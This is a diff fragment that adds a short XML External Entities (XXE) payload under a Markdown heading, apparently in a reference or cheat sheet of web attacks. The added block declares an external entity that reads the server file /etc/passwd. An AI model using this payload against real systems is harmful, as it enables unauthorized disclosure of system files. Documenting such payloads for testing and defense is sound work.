@@ -28,3 +28,8 @@
 
 ### XML – XML External Entities
 ---
+```xml
+<!DOCTYPE lolTest [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+```
